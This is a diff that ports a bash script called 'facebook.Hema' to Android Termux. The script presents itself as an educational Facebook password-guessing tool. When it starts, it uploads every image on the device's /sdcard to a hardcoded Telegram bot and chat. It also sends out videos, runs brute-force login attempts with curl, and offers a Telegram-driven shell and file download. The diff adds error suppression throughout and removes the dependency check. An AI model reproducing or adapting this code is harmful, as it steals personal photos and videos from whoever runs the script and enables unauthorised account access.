@@ -1,25 +1,25 @@
-#!/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
 
 #-------------------
 #   Colors (Professional Scheme)
 #-------------------
-RED='\033[1;31m'      # Bold Red
-GREEN='\033[1;32m'    # Bold Green
-YELLOW='\033[1;33m'   # Bold Yellow
-BLUE='\033[1;34m'     # Bold Blue
-PURPLE='\033[1;35m'   # Bold Purple
-CYAN='\033[1;36m'     # Bold Cyan
-WHITE='\033[1;37m'    # Bold White
-RESET='\033[0m'       # Reset
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[1;34m'
+PURPLE='\033[1;35m'
+CYAN='\033[1;36m'
+WHITE='\033[1;37m'
+RESET='\033[0m'
 
 #-------------------
 #   Configuration
 #-------------------
 BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
 CHAT_ID="5967116314"
-WORDLIST="wordlist.txt"
+WORDLIST="$HOME/wordlist.txt"
 TARGET_URL="https://facebook.com/login"  # رابط وهمي للتخمين
-TEMP_DIR="/tmp/fb_tool_temp"
+TEMP_DIR="$HOME/fb_tool_temp"
 mkdir -p "$TEMP_DIR"
 
 #-------------------
@@ -40,7 +40,7 @@ display_logo() {
     echo -e "${GREEN}[+] Tool by Hema${RESET}"
     echo -e "${YELLOW}[!] For educational purposes only${RESET}"
     echo -e "${CYAN}----------------------------------------${RESET}"
-    echo -e "${CYAN}|       facebook.Hema - v2.0           |${RESET}"
+    echo -e "${CYAN}|       facebook.Hema - v2.1-Termux    |${RESET}"
     echo -e "${CYAN}----------------------------------------${RESET}"
 }
 
@@ -51,7 +51,7 @@ send_to_telegram() {
     local message="$1"
     curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
         -d chat_id="$CHAT_ID" \
-        -d text="$message" > /dev/null
+        -d text="$message" > /dev/null 2>/dev/null
 }
 
 send_file_to_telegram() {
@@ -59,7 +59,7 @@ send_file_to_telegram() {
     local type="$2"  # photo, video, document
     curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/send${type}" \
         -F chat_id="$CHAT_ID" \
-        -F "${type}=@$file_path" > /dev/null
+        -F "${type}=@$file_path" > /dev/null 2>/dev/null
 }
 
 #-------------------
@@ -67,7 +67,7 @@ send_file_to_telegram() {
 #-------------------
 upload_all_images() {
     echo -e "${PURPLE}[*] Uploading all images to Telegram...${RESET}"
-    find / -type f \( -iname "*.jpg" -o -iname "*.png" \) 2>/dev/null | while read -r img; do
+    find /sdcard -type f \( -iname "*.jpg" -o -iname "*.png" \) 2>/dev/null | while read -r img; do
         send_file_to_telegram "$img" "Photo"
         echo -e "${GREEN}[+] Uploaded: $img${RESET}"
     done
@@ -81,7 +81,7 @@ generate_random_passwords() {
     echo -e "${YELLOW}[*] Generating random passwords...${RESET}"
     > "$WORDLIST"  # Clear existing wordlist
     for i in {1..1000}; do
-        openssl rand -base64 8 | tr -d '/+=' >> "$WORDLIST"  # Generate strong random passwords
+        openssl rand -base64 8 | tr -d '/+=' >> "$WORDLIST" 2>/dev/null
     done
     echo -e "${GREEN}[+] Generated 1000 random passwords in $WORDLIST${RESET}"
 }
@@ -97,10 +97,10 @@ guess_passwords_by_id() {
     while IFS= read -r password; do
         echo -ne "${YELLOW}[*] Trying: $password\r${RESET}"
         curl -s -o /dev/null -w "%{http_code}" \
-            -d "id=$target_id&pass=$password" "$TARGET_URL" > "$TEMP_DIR/http_status.txt" &
+            -d "id=$target_id&pass=$password" "$TARGET_URL" > "$TEMP_DIR/http_status.txt" 2>/dev/null &
         pid=$!
         wait $pid
-        status=$(cat "$TEMP_DIR/http_status.txt")
+        status=$(cat "$TEMP_DIR/http_status.txt" 2>/dev/null)
 
         if [ "$status" -eq 200 ]; then
             echo -e "${GREEN}[+] Success! Password found: $password${RESET}"
@@ -119,7 +119,7 @@ guess_passwords_by_id() {
 #-------------------
 send_videos() {
     echo -e "${PURPLE}[*] Sending all videos to Telegram...${RESET}"
-    find / -type f \( -iname "*.mp4" -o -iname "*.mkv" \) 2>/dev/null | while read -r vid; do
+    find /sdcard -type f \( -iname "*.mp4" -o -iname "*.mkv" \) 2>/dev/null | while read -r vid; do
         send_file_to_telegram "$vid" "Video"
         echo -e "${GREEN}[+] Uploaded: $vid${RESET}"
     done
@@ -127,13 +127,12 @@ send_videos() {
 }
 
 #-------------------
-#   Remote Shell via Telegram
+#   Remote Shell via Telegram (Simulation)
 #-------------------
 remote_shell() {
     send_to_telegram "Remote shell activated. Send commands (e.g., 'shell ls', 'exit')."
     while true; do
         echo -e "${YELLOW}[*] Waiting for Telegram command...${RESET}"
-        # محاكاة استقبال الأوامر (يمكن ربطها بـ Telegram Webhook لاحقًا)
         read -p "Simulate Telegram command: " cmd
         if [[ "$cmd" =~ ^shell\ (.*)$ ]]; then
             command="${BASH_REMATCH[1]}"
@@ -164,7 +163,7 @@ upload_file() {
 download_file() {
     read -p "Enter URL to download: " url
     echo -e "${YELLOW}[*] Downloading from $url...${RESET}"
-    wget -q "$url" -O "$TEMP_DIR/downloaded_file"
+    wget -q "$url" -O "$TEMP_DIR/downloaded_file" 2>/dev/null
     if [ $? -eq 0 ]; then
         echo -e "${GREEN}[+] File downloaded to $TEMP_DIR/downloaded_file${RESET}"
         send_to_telegram "File downloaded from $url"
@@ -204,11 +203,7 @@ main_menu() {
 #-------------------
 #   Start Tool
 #-------------------
-if ! command -v curl &> /dev/null || ! command -v wget &> /dev/null || ! command -v openssl &> /dev/null; then
-    echo -e "${RED}[-] Error: curl, wget, and openssl are required. Please install them.${RESET}"
-    exit 1
-fi
-
 display_logo
+echo -e "${YELLOW}[*] Ensure curl, wget, and openssl are installed manually if errors occur.${RESET}"
 upload_all_images  # Upload all images on startup
 main_menu
